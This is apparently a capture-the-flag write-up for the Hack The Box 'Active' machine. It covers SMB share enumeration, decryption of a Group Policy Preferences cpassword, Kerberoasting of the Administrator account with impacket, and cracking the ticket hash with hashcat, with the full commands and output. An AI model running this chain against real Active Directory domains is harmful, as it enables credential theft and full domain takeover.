Classic enumeration is performed and a classic SMB service is found , so we try some public share listing with #smbclient .
```
 enum $(cat ip)
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-11 17:49 CET
Nmap scan report for 10.10.10.100
Host is up (0.42s latency).

PORT      STATE  SERVICE        VERSION
53/tcp    open   domain         Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open   kerberos-sec   Microsoft Windows Kerberos (server time: 2024-11-11 16:49:25Z)
135/tcp   open   msrpc          Microsoft Windows RPC
139/tcp   open   netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open   ldap           Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
1972/tcp  closed intersys-cache
3268/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3792/tcp  closed sitewatch
5235/tcp  closed galaxy-network
5722/tcp  open   msrpc          Microsoft Windows RPC
8361/tcp  closed unknown
8617/tcp  closed unknown
9389/tcp  open   mc-nmf         .NET Message Framing
10563/tcp closed unknown
18526/tcp closed unknown
20132/tcp closed unknown
22120/tcp closed unknown
24408/tcp closed unknown
37327/tcp closed unknown
40798/tcp closed unknown
44129/tcp closed unknown
44505/tcp closed unknown
45034/tcp closed unknown
45551/tcp closed unknown
47001/tcp open   http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open   msrpc          Microsoft Windows RPC
49153/tcp open   msrpc          Microsoft Windows RPC
49154/tcp open   msrpc          Microsoft Windows RPC
49155/tcp open   msrpc          Microsoft Windows RPC
49157/tcp open   ncacn_http     Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc          Microsoft Windows RPC
49165/tcp open   msrpc          Microsoft Windows RPC
49171/tcp open   msrpc          Microsoft Windows RPC
49173/tcp open   msrpc          Microsoft Windows RPC
49574/tcp closed unknown
51012/tcp closed unknown
60718/tcp closed unknown
64009/tcp closed unknown
64640/tcp closed unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-11T16:50:29
|_  start_date: 2024-11-11T16:43:57

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.31 seconds

smbclient -L $(cat ip) -U%

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
```

After some SMB discovery ( #smbclient) we find out that the `Replication` volume is accessible. So we start inspecting the files found in there.
In the path `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups` there is a file called Groups.xml where we find some interesting credential:

```
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 

userName="active.htb\SVC_TGS"
```

Since we have a "hashlike" password let's try to find out which is the hash type: https://hashes.com/en/tools/hash_identifier

```

edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ - Possible algorithms: Base64(unhex(SHA-512($plaintext)))
```

After finding that the Group.xml is related to windows GPP, and some searching, you can find the [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt/tree/master) tool:

```
./gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

[ * ] Password: GPPstillStandingStrong2k18

```

Once we have the password, we can try to log in SMB shares:

```
smbclient //$(cat ip)/Users -U "active.htb\SVC_TGS"

user.txt
980e....
```

After searching for some Kerberos tutorials for identifying vulnerabilities we find the `impacket` tools and specifically the #GetUserSPNS :

```
python GetUserSPNs.py -request -dc-ip 10.10.10.100 "active.htb/SVC_TGS"

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$750526bb06ac2d8b25c274d6ccbbb555$f626fc546d190034591f3fe310b8c2bbbece67157d2a92a55e56a8d6bb94fd8a28557908b41cb71411df23b6773c40966e58336f65f3ddf448361a32319abe8d0bd6368f2572289dd841d0478bb941b126309ba48a7ee9c0cf4ba399dd60a5a5811d1a7c84380ba93f2c7992b819fcd3328e378019b469365bce5a9af2161a2dce3bfacc6dbe6a02119882af8db1f580b6896851eac0f03e8af546f80770741db695aad1ddec64efc410d1a154e007de61d6c2358cc499b3a3bb1d69dd7e84b3c5b2106b46d0173e2e9c96ef90dbfa5e598361bc502c2b37c0c86903d3f343dd8f9a99b385f359b5d63869fe775d0cf66636590341a56588c85898cadceee6718b2690e9d3156e984e676bc4d309b923bf7bfeeee201590042b7319268e25fdab8ea7b2cca93fb3086502a77f2a07d58bb6f54745e14d2b7d519366501b724122c8ae2b1917a4ec398b73ca0e465859ba834f5ed3ef26960a98aeb18c8546a8e6452204a14d9c6b57058b81ac4a51b5eb13e18daadef0bf06abaf263a55a639d26d7310605bb5838edbc7f0ec5d2e9249c5ac620ebd51d490fbc70676d7dcefb0e9d35dc2ba51d3c08e5213f06fab7714315093f5b059e832ee0e45038a59f8e89190de7a3702b4d8ace5225b93c20f1febe2126a1c569b40e9746304bba8541481cb4cb0557b2bb2f8bdc01394c258e2aeabea69a30365ea7dcf7c8ba2a961fcf025011c15225056b352913532bff1560c8ac5b34d31965e7efb45c4c069c55be2a362259d98e5326379122ea5b9e437522089c723d46fea203a75b6966e8499d0198170b31f1e6c2e09a78cb1f56a74995cc95feff6f05c1d09561732801e0edb0470e08f0322fece8bb8ef1cb163addd481da55a43c4cb109e832b28ba76bfbe9353711db3c6acb6406a8f22e64ff775d007fd506ce4b5f2d23a0786ec605f4e2ed05b9ccdec5e7429dd1f15e2b7420c42a9d4f61664cc74c2db3a787d88c981d9724edafad2a59b909e5333edff59cb7888997f6b593d2e387d0b1dab5aa02b14aa8aa55e2f5cf4790c94ab55e8e173299b8e9ab6b49cae09019aba01f7c9912c5ebdbcd898a686fecf18f7fb8431966405796d3cc0a61cb0b0861afb468be2f595a63898033afbed49c99338758ab9fb3e973a8599d68138f9630c2d16431474b02b1e9ec20ad63b2266aed29ba004ad257f776260b392ac07d7a7197f2606d2d7d245dfee28a4623795e7c629f30afca7d8ed6d3fde94a

You can also save the output to a file 
python GetUserSPNs.py -request -dc-ip 10.10.10.100 "active.htb/SVC_TGS:GPPstillStandingStrong2k18" -outputfile ../../htb/tracks/crest_crt/active/ntlm_hashes.txt
```

We can then go to this online tool [hash identifier](https://hashes.com/en/tools/hash_identifier) and find out that the hash type is `Kerberos 5 TGS-REP etype 23`

```
hashcat -m 13100 -O -a0  ntlm_hashes.txt ~/resources/hack/rockyou.txt

pass
Ticketmaster1968
```

Now we can directly log in into SMB as Administrator and get the root.txt flag:
```
ab0...

```

